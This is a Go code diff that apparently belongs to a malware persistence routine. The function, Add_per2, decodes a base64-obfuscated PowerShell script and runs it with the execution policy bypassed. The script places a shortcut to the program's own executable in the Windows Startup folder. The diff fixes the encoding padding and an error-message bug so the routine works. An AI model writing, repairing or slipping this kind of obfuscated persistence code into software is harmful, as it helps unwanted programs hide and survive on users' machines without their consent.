@@ -18,7 +18,7 @@ func Add_per2() {
 	exePath := GetExecutablePath()
 	fmt.Println("Exe path:", exePath)
 
-	psScript := decode("cGFyYW0gKAogICAgW3N0cmluZ10kdGFyZ2V0UGF0aCwKICAgIFtzdHJpbmddJHNob3J0Y3V0UGF0aCwKICAgIFtzdHJpbmddJGRlc2NyaXB0aW9uCikKCiRXU2NyaXB0U2hlbGwgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgV1NjcmlwdC5TaGVsbAokc2hvcnRjdXQgPSAkV1NjcmlwdFNoZWxsLkNyZWF0ZVNob3J0Y3V0KCRzaG9ydGN1dFBhdGgpCiRzaG9ydGN1dC5UYXJnZXRQYXRoID0gJHRhcmdldFBhdGgKJHNob3J0Y3V0LkRlc2NyaXB0aW9uID0gJGRlc2NyaXB0aW9uCiRzaG9ydGN1dC5TYXZlKCk==")
+	psScript := decode("cGFyYW0gKAogICAgW3N0cmluZ10kdGFyZ2V0UGF0aCwKICAgIFtzdHJpbmddJHNob3J0Y3V0UGF0aCwKICAgIFtzdHJpbmddJGRlc2NyaXB0aW9uCikKCiRXU2NyaXB0U2hlbGwgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgV1NjcmlwdC5TaGVsbAokc2hvcnRjdXQgPSAkV1NjcmlwdFNoZWxsLkNyZWF0ZVNob3J0Y3V0KCRzaG9ydGN1dFBhdGgpCiRzaG9ydGN1dC5UYXJnZXRQYXRoID0gJHRhcmdldFBhdGgKJHNob3J0Y3V0LkRlc2NyaXB0aW9uID0gJGRlc2NyaXB0aW9uCiRzaG9ydGN1dC5TYXZlKCk=")
 
 	psScriptFile := "create_shortcut.ps1"
 	// open a file handel
@@ -43,7 +43,7 @@ func Add_per2() {
 	comm := "powershell -ExecutionPolicy Bypass -File " + psScriptFile + " -targetPath \"" + exePath + "\" -shortcutPath \"" + shortcutPath + "\" -description \"" + "MyApp" + "\""
 	_ , err = winapiV2.Exec(comm)
 	if err != nil {	
-		fmt.Printf("Error creating shortcut: %v\nOutput: %s\n", err)
+		fmt.Printf("Error creating shortcut: %v\nOutput: %s\n", err,"")
 		return
 	}
 	fmt.Println("Shortcut created in Startup folder")
